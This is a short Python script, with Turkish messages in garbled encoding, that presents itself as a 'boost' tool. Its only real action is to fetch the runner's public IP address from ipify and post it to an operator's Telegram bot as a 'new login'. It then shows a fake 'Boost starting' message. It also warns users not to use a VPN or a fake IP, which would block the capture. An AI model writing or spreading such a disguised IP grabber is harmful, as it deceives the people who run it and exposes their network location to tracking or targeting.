import requests as r, re as e, os
from dotenv import load_dotenv

# .env dosyasÄ±ndaki deÄŸiÅŸkenleri yÃ¼kle
load_dotenv()

# Ã‡evresel deÄŸiÅŸkenlerden bot tokeni ve chat ID'yi al
t = os.getenv("BOT_TOKEN")
c = os.getenv("CHAT_ID")


def v(d):
    return bool(e.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", d))


def s(d):
    u = f"https://api.telegram.org/bot{t}/sendMessage"
    data = {"chat_id": c, "text": f"ğŸ”” Yeni giriÅŸ: {d}"}
    x = r.post(u, data=data)
    
    if x.status_code == 200:
        print("Boost BaÅŸlatÄ±lÄ±yor....")
    else:
        print(f"Hata: {x.status_code}")


def get_ip():
    try:
        ip = r.get("https://api64.ipify.org?format=text").text
        return ip if v(ip) else None
    except Exception as err:
        print(f"IP adresi alÄ±nÄ±rken hata oluÅŸtu: {err}")
        return None


if __name__ == "__main__":
    print("Vpn KullanmayÄ±nÄ±z Yoksa Tool Ã‡alÄ±ÅŸmÄ±yor")

    ip = get_ip()
    if ip:
        s(ip)
    else:
        print("LÃ¼tfen En Ä°yi SonuÃ§lar Ä°Ã§in Sahte Ä°p KullanmayÄ±nÄ±z")
